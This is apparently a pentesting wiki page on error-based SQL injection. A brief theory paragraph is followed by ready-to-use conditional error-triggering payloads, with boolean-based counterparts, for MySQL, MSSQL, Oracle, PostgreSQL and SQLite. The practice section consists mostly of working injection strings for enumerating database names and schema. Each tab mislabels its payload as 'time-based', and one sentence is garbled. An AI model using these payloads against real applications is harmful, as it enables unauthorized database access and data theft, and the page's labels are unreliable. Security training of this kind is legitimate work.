# Error Based

## Theory

Error-based SQLi is an in-band SQL Injection technique that relies on error messages thrown by the database server to obtain information about the structure of the database. In some cases, error-based SQL injection alone is enough for an attacker to enumerate an entire database. While errors are very useful during the development phase of a web application, they should be disabled on a live site, or logged to a file with restricted access instead.

## Practice

The process is relatively the same as [Boolean Based](boolean-based.md) injection. All you have to do is modify the payloads to trigger an error wait.

{% tabs %}
{% tab title="MySQL" %}
A time-based SQLi payload in MySQL will look like this

```bash
1' AND IF(YOUR-CONDITION-HERE,(SELECT table_name FROM information_schema.tables),'a')--
```

Examples:

```bash
#Boolean Based  
1' AND (SELECT LENGTH(database()))=1-- -

#Error Based  
1' AND IF((SELECT LENGTH(database()))=1,(SELECT table_name FROM information_schema.tables),'a')--
```
{% endtab %}

{% tab title="MSSQL" %}
A time-based SQLi payload in MSSQL will look like this

```bash
1' AND CASE WHEN (YOUR-CONDITION-HERE) THEN 1/0 ELSE NULL END--
```

Examples:

```bash
#Boolean Based  
1' AND (SELECT LEN(DB_NAME()))=1--

#Error Based  
1' AND CASE WHEN ((SELECT LEN(DB_NAME()))=1) THEN 1/0 ELSE NULL END--
```
{% endtab %}

{% tab title="OracleSQL" %}
A time-based SQLi payload in OracleSQL will look like this

```bash
1' AND CASE WHEN (YOUR-CONDITION-HERE) THEN TO_CHAR(1/0) ELSE NULL END FROM dual--
```

Examples:

```bash
#Boolean Based  
1' AND (SELECT LENGTH(global_name) FROM global_name)=1--

#Error Based  
1' AND CASE WHEN ((SELECT LENGTH(global_name) FROM global_name)=1) THEN TO_CHAR(1/0) ELSE NULL END FROM dual--
```
{% endtab %}

{% tab title="PostgreSQL" %}
A time-based SQLi payload in PostgreSQL will look like this

```bash
1' AND 1 = CASE WHEN (YOUR-CONDITION-HERE) THEN 1/(SELECT 0) ELSE NULL END--
```

Examples:

```bash
#Boolean Based  
1' AND (SELECT LENGTH(current_database()))=1--

#Error Based    
1' AND 1 = CASE WHEN ((SELECT LENGTH(current_database()))=1) THEN 1/(SELECT 0) ELSE NULL END--
```
{% endtab %}

{% tab title="SQLite" %}
A time-based SQLi payload in SQLite will look like this

```bash
1' AND CASE WHEN (YOUR-CONDITION-HERE) THEN 1 ELSE load_extension(1) END--
```

Examples:

```bash
#Boolean Based  
1' AND (SELECT HEX(SUBSTR(sql,1,1)) FROM sqlite_master WHERE type!='meta' and sql NOT NULL AND name='TABLE_NAME_HERE')=HEX('C')--

#Error Based  
1' AND CASE WHEN ((SELECT HEX(SUBSTR(sql,1,1)) FROM sqlite_master WHERE type!='meta' and sql NOT NULL AND name='TABLE_NAME_HERE')=HEX('C')) THEN 1 ELSE load_extension(1) END--
```
{% endtab %}
{% endtabs %}
